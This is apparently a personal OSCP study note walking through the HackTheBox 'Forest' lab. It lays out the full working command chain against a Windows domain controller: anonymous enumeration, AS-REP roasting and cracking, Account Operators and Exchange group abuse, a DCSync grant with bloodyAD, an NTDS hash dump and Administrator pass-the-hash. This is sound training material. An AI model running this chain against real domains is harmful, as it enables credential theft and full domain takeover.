---
tags: [oscp, boxes, htb, windows, active-directory, completed]
platform: HackTheBox
os: Windows Server 2016 Standard 14393
ip: $BoxIP
difficulty: Easy
status: complete
---

# HTB: Forest, Full Walkthrough (Anonymous AD Enumeration → AS-REP Roasting → DCSync)

## Tags
#HTB #Forest #Windows #ActiveDirectory #ASREPRoasting #DCSync #AccountOperators #ExchangeAbuse #PassTheHash #Easy

## Box Info

**Target:** `$BoxIP` · **Difficulty:** Easy · **OS:** Windows Server 2016 Standard 14393 · **Platform:** HackTheBox

**The gist:** This is a Windows domain controller running Exchange. Anonymous RPC and LDAP enumeration expose different user lists. The service account found through RPC does not require Kerberos pre-authentication, so an AS-REP roasting request gives us a crackable ticket. The cracked credential gives WinRM access. That account is a member of Account Operators, which lets us create a controlled domain user and add it to Exchange Windows Permissions. That group can write the domain ACL, so bloodyAD grants DCSync rights. We dump the domain hashes, validate the Administrator hash with pass-the-hash, and confirm the root flag path.

## Variables

| Variable | Value |
|---|---|
| `$BoxName` | Forest |
| `$BoxIP` | Target IP from the active HTB instance |
| `$LocalIP` | Attacker VPN address |
| `$BoxDir` | `/home/kali/Platforms/HackTheBox/Forest` |
| `$Domain` | `htb.local` |
| `$FQDN` | `FOREST.htb.local` |
| `$Username` | Service account found during enumeration |
| `$Username2` | Controlled account created for DCSync |
| `$Password` | Cracked service-account password, kept private |
| `$Password2` | Controlled-account password, kept private |
| `$NtdsFile` | NetExec NTDS output filename |

Keep `$Password`, `$Password2`, and `$AdminHash` in shell variables or private loot only. Do not paste credential or flag values into the write-up.

## 1. Recon: Port Scan

```bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 $BoxIP -oN nmap/allports.txt
```


```

Open ports:

| Port | Service |
|---|---|
| 53/tcp | DNS |
| 88/tcp | Kerberos |
| 135/tcp | MSRPC |
| 139/tcp | NetBIOS |
| 389/tcp | LDAP |
| 445/tcp | SMB |
| 464/tcp | Kerberos password change |
| 593/tcp | RPC over HTTP |
| 636/tcp | LDAPS |
| 3268/tcp | Global Catalog LDAP |
| 3269/tcp | Global Catalog LDAPS |
| 5985/tcp | WinRM |
| 9389/tcp | AD Web Services |
| 47001/tcp | WinRM |
| 49664+ | Dynamic RPC |
```



![[1.1nmap-full.png]]

## 2. Service Scan

```bash
sudo nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 $BoxIP -oA nmap/${BoxName}_services
```

Key findings:

- Domain: `$Domain`
- FQDN: `$FQDN`
- Hostname: `FOREST`
- OS: Windows Server 2016 Standard 14393
- SMB signing is required, so direct SMB NTLM relay is not the first route.
- Kerberos is exposed and the clock skew must be checked before Kerberos tools are used.



![[1.2nmap-svcscan.png]]

## 3. Anonymous Enumeration

### RPC null session

RPC and LDAP do not always return identical results. Run both before building an AS-REP roasting list.

```bash
rpcclient -U '' -N $BoxIP -c 'enumdomusers'
```

The RPC result returned 31 accounts. It included the built-in accounts, Exchange system and health mailboxes, normal staff accounts, and `$Username`.

### Anonymous LDAP

```bash
ldapsearch -x -H ldap://$BoxIP \
  -b 'DC=htb,DC=local' \
  '(&(objectCategory=person)(objectClass=user))' \
  sAMAccountName | grep sAMAccountName
```

LDAP returned 28 accounts but did not return `$Username`. This difference is the key reason RPC and LDAP must both be checked.

> [!warning] 💡 Hint
> **Watch out:** RPC and LDAP can return different account lists. A service account missing from LDAP can still be exposed through an RPC null session, so do not stop after one anonymous enumeration method.

> [!tip] ⚡ More efficient path
> **What we did:** We ran RPC and LDAP enumeration separately and compared the results by hand.
>
> **Faster approach:**
> ```bash
> windapsearch -d $Domain --dc-ip $BoxIP -U
> ```
> **Why:** windapsearch can collect and format domain users in one pass. Still run `rpcclient` when anonymous LDAP output looks incomplete because the two protocols can expose different accounts.

![[2.1enum1.png]]
![[2.2enum-no-alfresco.png]]


### SMB null session

```bash
smbclient -N -L //$BoxIP
```

Anonymous login succeeded, but no useful shares were exposed. This was a dead end for the initial foothold.

## 4. Kerberos Clock Check

The service scan showed a clock difference of roughly seven minutes. Kerberos normally rejects authentication when the client and domain controller differ by more than about five minutes.

```bash
sudo timedatectl set-ntp false
sudo ntpdate $BoxIP
```

`ntpdate` stepped the clock. The VPN dropped after the time change, so the VPN was reconnected and the target was checked again before continuing.

> [!warning] 💡 Hint
> **Watch out:** A clock jump can disconnect the VPN. Reconnect it before running Kerberos tools, and check the target is reachable again.

## 5. AS-REP Roasting

Create a candidate list from the RPC output. Keep the ticket in the loot directory and never paste it into notes or chat.

```bash
cat > loot/users.txt << EOF
$Username
EOF

GetNPUsers.py $Domain/ \
  -dc-ip $BoxIP \
  -usersfile loot/users.txt \
  -no-pass \
  -request \
  -format hashcat \
  -outputfile loot/asrep.txt
```

> [!tip] ⚡ More efficient path
> **What we did:** We manually built a short username file from RPC output before requesting AS-REP tickets.
>
> **Faster approach:**
> ```bash
> GetNPUsers.py $Domain/ -dc-ip $BoxIP -no-pass -request -format hashcat -outputfile loot/asrep.txt
> ```
> **Why:** When anonymous LDAP enumeration is complete, GetNPUsers can enumerate candidates and request tickets in one command. Check the output file because a successful ticket may not be printed clearly.

The service account returned an AS-REP hash because Kerberos pre-authentication was disabled. The other tested accounts either had pre-authentication enabled or were disabled.

> [!warning] 💡 Hint
> **Watch out:** GetNPUsers can write a successful ticket to the output file without printing a useful success line. Check the output file after the command finishes.

![[3.1loot-alfresco-cracked-pwd.png]]

SCREENSHOT: AS-REP ticket saved to the loot directory. Redact the ticket before sharing screenshots.

## 6. Offline Cracking

```bash
hashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txt
```

The ticket cracked successfully. Store the result in `$Password` and do not put the cleartext value in a public write-up.

```bash
boxset Username $Username
boxset Password $Password
loot cred $Username $Password
```

![[3.1loot-alfresco-cracked-pwd.png]]

SCREENSHOT: Successful offline crack with the password redacted.

## 7. Credential Validation

```bash
netexec smb $BoxIP -u $Username -p $Password -d $Domain
netexec winrm $BoxIP -u $Username -p $Password -d $Domain
netexec ldap $BoxIP -u $Username -p $Password -d $Domain
```

WinRM authentication worked, giving us the foothold. SMB and LDAP authentication also worked.

![[4.netexec-result.png]]

SCREENSHOT: Credential validation showing successful WinRM authentication.

## 8. Foothold: WinRM

```bash
evil-winrm -i $BoxIP -u $Username -p $Password
```

Inside the shell:

```cmd
whoami
hostname
whoami /groups
```

The account was a member of `BUILTIN\\Account Operators`, `BUILTIN\\Remote Management Users`, and the service-account groups. Account Operators is the important finding because it can create domain users and add them to many non-protected groups.

![[5.foothold.png]]

SCREENSHOT: Authenticated WinRM foothold and group membership.

## 9. User Flag Confirmation

Do not print the flag. Confirm only that the file exists:

```powershell
Test-Path C:\Users\$Username\Desktop\user.txt
```

The file existed at `C:\Users\$Username\Desktop\user.txt`.

![[6.loot-user-flag.png]]

SCREENSHOT: User flag path confirmation with the value hidden.

## 10. Privilege Escalation: Account Operators to DCSync

### Step A: Create a controlled domain user

```cmd
net user $Username2 $Password2 /add /domain
net user $Username2 /domain
```

The account was created and initially belonged only to Domain Users.

### Step B: Add the user to Exchange Windows Permissions

```cmd
net group "Exchange Windows Permissions" $Username2 /add /domain
net user $Username2 /domain
```

The controlled account then appeared in the group membership output.

![[7.user-audit-sync.png]]

SCREENSHOT: Controlled account added to Exchange Windows Permissions.

> [!tip] ⚡ More efficient path
> **What we did:** We first tried to load PowerView over WinRM and modify the domain ACL from the original service-account session.
>
> **Faster approach:**
> ```bash
> bloodyAD -d $Domain -u $Username2 -p $Password2 -H $BoxIP -i $BoxIP add dcsync $Username2
> ```
> **Why:** bloodyAD performs the LDAP ACL change directly from Kali and uses the controlled account's refreshed group membership. This avoids a PowerView version mismatch and avoids downloading a PowerShell script.

### Step C: Grant DCSync rights

PowerView was tested first, but the old local PowerView version failed to commit the ACL. The reliable command was:

```bash
bloodyAD -d $Domain \
  -u $Username2 \
  -p $Password2 \
  -H $BoxIP \
  -i $BoxIP \
  add dcsync $Username2
```

Output confirmed that `$Username2` could DCSync.

![[8.DCSync-success.png]]

SCREENSHOT: Successful DCSync rights grant.

### Step D: Dump domain hashes

The local Impacket installation returned `ERROR_DS_DRA_BAD_DN`, so NetExec was used for the NTDS extraction:

> [!warning] 💡 Hint
> **Watch out:** `secretsdump` can fail even after DCSync rights are correct because of client or domain-controller compatibility. Treat `ERROR_DS_DRA_BAD_DN` as a tool failure to troubleshoot, then test another supported DCSync client.

```bash
netexec smb $BoxIP \
  -u $Username2 \
  -p $Password2 \
  -d $Domain \
  --ntds
```

> [!tip] ⚡ More efficient path
> **What we did:** We tried multiple Impacket `secretsdump` versions before switching tools.
>
> **Faster approach:**
> ```bash
> netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds
> ```
> **Why:** NetExec can request the NTDS data directly when the account has replication rights. It avoids losing time to a broken local Impacket installation.

The command dumped the domain NTDS hashes to the local NetExec log directory. Copy the resulting file into the box loot directory without displaying its contents:

```bash
cp /home/kali/.nxc/logs/ntds/$NtdsFile loot/dcsync.ntds
```

![[9.full-NTDS-dump.png]]

SCREENSHOT: Full NTDS dump with all hash values redacted.

## 11. Pass-the-Hash to Domain Administrator

Load the Administrator NTLM hash into a variable instead of printing it:

```bash
AdminHash=$(awk -F: '$1 ~ /Administrator$/ {print $4; exit}' loot/dcsync.ntds)
```

Validate it against the domain:

```bash
netexec smb $BoxIP -u Administrator -H $AdminHash -d $Domain
```

Use the hash for an administrator shell:

```bash
evil-winrm -i $BoxIP -u Administrator -H $AdminHash
```

Confirm the identity and flag path without reading the file:

```cmd
whoami
hostname
ipconfig
dir C:\Users\Administrator\Desktop /a
```

The output confirmed `htb\\administrator` and showed `root.txt` on the Administrator desktop.

![[10.loot-AD-flag.png]]


SCREENSHOT: Administrator pass-the-hash shell, target IP, and root flag filename. Do not capture the flag value.
![[11.PROOF.png]]
## 12. Clean-down

The controlled domain account and its group membership were removed:

```cmd
net user $Username2 /delete /domain
```

The DCSync delegation was removed before deleting the account:

```bash
bloodyAD -d $Domain \
  -u $Username2 \
  -p $Password2 \
  -H $BoxIP \
  -i $BoxIP \
  remove dcsync $Username2
```

The PowerView payload was deleted from the local web directory and verified with HTTP 404. The temporary Impacket environment was removed. The HTTP server and Evil-WinRM process were stopped.

No target system files were modified. The scan and loot files remain locally as study artifacts.

## Credentials

| Username | Password / Hash | Source | Use |
|---|---|---|---|
| `$Username` | `$Password` | AS-REP roasting | WinRM foothold |
| `Administrator` | `$AdminHash` | DCSync | Pass-the-hash |

## Techniques

| Technique | Result |
|---|---|
| Anonymous RPC enumeration | Found an account LDAP missed |
| Anonymous LDAP bind | Enumerated domain users |
| AS-REP roasting | Recovered a crackable service-account ticket |
| Account Operators abuse | Created a controlled domain user |
| Exchange Windows Permissions abuse | Reached the domain ACL path |
| DCSync | Extracted domain NTLM hashes |
| Pass-the-hash | Confirmed Administrator access |

## Lessons Learned

- Run RPC and LDAP enumeration separately because their anonymous results can differ.
- Check clock skew before Kerberos tools. Reconnect the VPN after a large time correction.
- Check GetNPUsers output files even when the terminal does not show a success line.
- Account Operators does not mean Domain Administrator. Use the Exchange Windows Permissions path where it exists.
- Use a refreshed controlled-account session when relying on newly granted group membership.
- Keep hashes and flags out of screenshots and notes shared outside the private vault.

## External Resources

- [HackTricks - AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproasting)
- [HackTricks - DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
- [PayloadsAllTheThings - Active Directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [Impacket GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
- [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

## Vault Update Checklist

- [x] Write-up added
- [x] Screenshots referenced
- [x] Credentials stored as variables
- [x] Flag values withheld
- [x] Cleanup recorded
- [x] AD hub coverage checked
## RUNBOOK V2 Stages Used

- [[RUNBOOK V2/AD - Service Scan]] -- technique used in this walkthrough
- [[RUNBOOK V2/AD - AS-REP Roasting]] -- technique used in this walkthrough
- [[RUNBOOK V2/AD - Kerberoasting]] -- technique used in this walkthrough
- [[RUNBOOK V2/AD - BloodHound]] -- technique used in this walkthrough
- [[RUNBOOK V2/AD - DCSync Dump]] -- technique used in this walkthrough
- [[RUNBOOK V2/AD - Pass the Hash]] -- technique used in this walkthrough

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/AD/Sauna|Sauna]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/AD/Flight|Flight]] -- shares a similar enumeration or escalation pattern
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.

## Attack Chain

1. [[RUNBOOK V2/AD - Service Scan]] and anonymous enumeration exposed the domain services and candidate usernames.
2. [[RUNBOOK V2/AD - AS-REP Roasting]] produced a crackable response for an account without Kerberos pre-authentication.
3. [[RUNBOOK V2/AD - Kerberoasting]] and [[RUNBOOK V2/AD - BloodHound]] checked the remaining ticket and relationship paths.
4. [[RUNBOOK V2/AD - DCSync Dump]] and [[RUNBOOK V2/AD - Pass the Hash]] recovered and validated the administrator access path.

## Flags

- `user.txt`: `$UserFlag` (keep the value private)
- `root.txt`: `$RootFlag` (keep the value private)
- `proof.txt`: `$ProofFlag` (keep the value private)

## Lessons Learned

- Different anonymous protocols can expose different pieces of the same domain picture.
- Group membership and ACL rights must be checked before assuming a cracked account is only a foothold.
